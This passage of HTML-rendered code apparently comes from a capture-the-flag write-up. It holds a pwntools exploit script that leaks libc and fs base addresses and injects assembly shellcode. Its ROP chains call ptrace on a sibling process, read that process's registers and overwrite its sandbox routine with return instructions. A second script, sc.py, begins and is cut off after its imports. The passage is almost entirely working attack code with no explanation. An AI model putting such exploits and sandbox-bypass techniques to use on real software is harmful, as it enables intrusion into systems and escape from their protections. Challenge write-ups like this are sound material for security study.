class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_right_value = -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	game(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	text = p.recv(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;NONONO!!!&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		rand_right_value = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt;(rand_right_value != -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	game(rand_right_value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27; $ &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	money = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;,&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(money)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; money &amp;gt;= &lt;span class=&#34;number&#34;&gt;134217728&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x19f9)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Exit\n&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pid = u32(rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Y&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pid&amp;#x27;&lt;/span&gt;, pid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Exit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov rsi,fs:[rax]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov rsp,rsi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov dword [rsi + 0x6], eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    inc dx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    push 20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    pop rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    inc di&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    syscall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    xor rdi, rdi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    push 19&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    pop rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    syscall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    ret&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x19be)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;CAN I SAY:&amp;#x27;&lt;/span&gt;, asm(sc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fs_base = u64(r(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r_s = u64(r(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r(&lt;span class=&#34;number&#34;&gt;0xb20&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = u64(r(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    leak = p.recv(timeout=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(leak)==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc_base&amp;#x27;&lt;/span&gt;, libc_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;fs_base&amp;#x27;&lt;/span&gt;, fs_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;r_s&amp;#x27;&lt;/span&gt;, r_s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rax = libc_base + &lt;span class=&#34;number&#34;&gt;0x0000000000045eb0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = libc_base + &lt;span class=&#34;number&#34;&gt;0x000000000002a3e5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsi = libc_base + &lt;span class=&#34;number&#34;&gt;0x000000000002be51&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdx_r12 = libc_base + &lt;span class=&#34;number&#34;&gt;0x000000000011f2e7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rcx = libc_base + &lt;span class=&#34;number&#34;&gt;0x000000000003d1ee&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = libc_base + &lt;span class=&#34;number&#34;&gt;0x0000000000029139&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall = libc_base + &lt;span class=&#34;number&#34;&gt;0x0000000000118f34&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getpid = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;getpid&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptrace = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ptrace&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wait4 = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;wait4&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system, binsh = get_sb()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ptrace 101&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# wait4 61&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pid = &lt;span class=&#34;number&#34;&gt;0x1bf2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user_regs_struct_buf = libc_base + libc.bss(&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ptarce(0x10, pid, 0, 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop = p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(rcx) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(ptrace)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ptarce(0x18, pid, 0, 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(rcx) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(ptrace)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# wait4(pid, 0, 0, 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rdi) + p64(pid) + p64(rsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(rcx) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(rax) + p64(&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;) + p64(syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ptarce(0x18, pid, 0, buf)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(rcx) + p64(user_regs_struct_buf) + p64(ptrace)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# leak pro_base&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rax) + p64(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;) + p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(rsi) + p64(fs_base + &lt;span class=&#34;number&#34;&gt;0x1f0&lt;/span&gt;) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# readv and rop&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rax) + p64(&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;) + p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(rsi) + p64(fs_base + &lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(user_regs_struct_buf + &lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;) + p64(fs_base + &lt;span class=&#34;number&#34;&gt;0x1f0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(rop)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pid_pro_base = u64(r(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)) - &lt;span class=&#34;number&#34;&gt;0x3d10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# change sandbox = ret&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sandbox = pid_pro_base + &lt;span class=&#34;number&#34;&gt;0x14F6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &lt;span class=&#34;number&#34;&gt;0xc3c3c3c3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ptarce(0x5, pid, sandbox, data)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop = p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;0x5&lt;/span&gt;) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(sandbox)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(rcx) + p64(data) + p64(ptrace)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ptarce(0x11, pid, 0, buf)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rdi) + p64(&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; + p64(rcx) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(ptrace)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# exit(0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(rax) + p64(&lt;span class=&#34;number&#34;&gt;0x3c&lt;/span&gt;) + p64(syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s(rop)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pid_pro_base&amp;#x27;&lt;/span&gt;, pid_pro_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;sc.py&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span 